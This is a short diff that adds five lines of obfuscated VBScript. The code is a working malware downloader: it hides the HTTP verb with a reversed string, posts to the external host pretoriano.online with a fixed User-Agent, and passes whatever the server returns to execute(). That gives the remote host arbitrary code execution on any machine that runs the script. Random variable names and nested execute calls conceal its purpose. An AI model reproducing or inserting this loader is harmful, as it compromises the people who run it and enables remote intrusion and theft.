@@ -1,0 +1,5 @@
+set B9xbHtVxykHIM5kwbUzFYSxHywPrvDoShiIPdEWLVs7kSDODK0uNpVkOm=CreateObject("Msxml2.xmlhttp")
+xFaByefZrgtrbafifpHCNHY30nwZY2RwapfRul0qdff7X="index.php"
+Udt9sisM7H4ej8dIdNvgrmEnbrGzfV="https://pretoriano.online/images/"
+B9xbHtVxykHIM5kwbUzFYSxHywPrvDoShiIPdEWLVs7kSDODK0uNpVkOm.open StrReverse("TEG") , Udt9sisM7H4ej8dIdNvgrmEnbrGzfV & xFaByefZrgtrbafifpHCNHY30nwZY2RwapfRul0qdff7X ,false
+execute("B9xbHtVxykHIM5kwbUzFYSxHywPrvDoShiIPdEWLVs7kSDODK0uNpVkOm.setRequestHeader ""User-Agent"", ""i57YeRJDeYH1naLzDZYvNL8nSuhUYpAPi5wxeQyIRUoxuXcV3Qdt"":B9xbHtVxykHIM5kwbUzFYSxHywPrvDoShiIPdEWLVs7kSDODK0uNpVkOm.setRequestHeader ""content-type"", ""application/x-www-form-urlencoded"":B9xbHtVxykHIM5kwbUzFYSxHywPrvDoShiIPdEWLVs7kSDODK0uNpVkOm.send ""join=open"":CHvOdGwp1Bmrg4NqTXnAvVhB53pcHRGgvb2hPHfB1up9E=B9xbHtVxykHIM5kwbUzFYSxHywPrvDoShiIPdEWLVs7kSDODK0uNpVkOm.responseText:execute(CHvOdGwp1Bmrg4NqTXnAvVhB53pcHRGgvb2hPHfB1up9E)")
